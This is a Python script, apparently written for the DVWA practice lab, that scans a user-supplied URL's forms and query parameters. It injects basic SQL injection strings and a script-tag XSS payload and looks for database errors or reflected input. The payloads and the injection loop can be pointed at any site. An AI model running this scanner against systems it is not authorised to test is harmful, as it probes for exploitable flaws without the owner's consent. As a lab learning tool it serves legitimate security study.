import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# üîê Replace with your actual DVWA session ID
cookies = {
    'PHPSESSID': 'b862ac9938cdbab45405b39cb06bb2f7',
    'security': 'low'
}

def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url, cookies=cookies).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_name = tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        input_name = input.get("name")
        if input_name:
            if input["type"] in ["text", "search"]:
                data[input_name] = payload
            else:
                data[input_name] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, cookies=cookies)
    return requests.get(target_url, params=data, cookies=cookies)

def is_sqli_vulnerable(response):
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    for error in errors:
        if error in response.text.lower():
            return True
    return False

def test_sql_injection_forms(url):
    forms = get_all_forms(url)
    sql_payloads = ["' OR '1'='1", "';--", "\" OR \"1\"=\"1"]
    found = False

    for form in forms:
        form_details = get_form_details(form)
        for payload in sql_payloads:
            response = submit_form(form_details, url, payload)
            if is_sqli_vulnerable(response):
                print(f"[!] SQL Injection vulnerability found in form with payload: {payload}")
                found = True
                break
    if not found:
        print("[-] No SQL Injection vulnerability detected in form inputs.")

def test_sql_injection_url_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    sql_payloads = ["' OR '1'='1", "';--", "\" OR \"1\"=\"1"]
    found = False

    for param in params:
        for payload in sql_payloads:
            test_params = params.copy()
            test_params[param] = payload
            new_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            response = requests.get(test_url, cookies=cookies)
            if is_sqli_vulnerable(response):
                print(f"[!] SQL Injection vulnerability found in URL param `{param}` with payload: {payload}")
                found = True
                break
    if not found:
        print("[-] No SQL Injection vulnerability detected in URL parameters.")

def test_xss_in_forms(url):
    forms = get_all_forms(url)
    xss_payload = "<script>alert('XSS')</script>"
    found = False

    print(f"[+] Detected {len(forms)} form(s)")
    for form in forms:
        form_details = get_form_details(form)
        response = submit_form(form_details, url, xss_payload)
        if xss_payload.lower() in response.text.lower() or "alert(" in response.text:
            print(f"[!] XSS vulnerability found in form with payload: {xss_payload}")
            found = True
    if not found:
        print("[-] No XSS vulnerability detected in form inputs.")

def test_xss_in_url_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    xss_payload = "<script>alert(1)</script>"
    found = False

    for param in params:
        test_params = params.copy()
        test_params[param] = xss_payload
        new_query = urlencode(test_params, doseq=True)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        response = requests.get(test_url, cookies=cookies)
        if xss_payload in response.text:
            print(f"[!] XSS vulnerability found in URL param `{param}` with payload: {xss_payload}")
            found = True
    if not found:
        print("[-] No XSS vulnerability detected in URL parameters.")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ").strip()
    print(f"[+] Scanning: {target_url}\n")
    test_sql_injection_forms(target_url)
    test_sql_injection_url_params(target_url)
    print()
    test_xss_in_forms(target_url)
    test_xss_in_url_params(target_url)
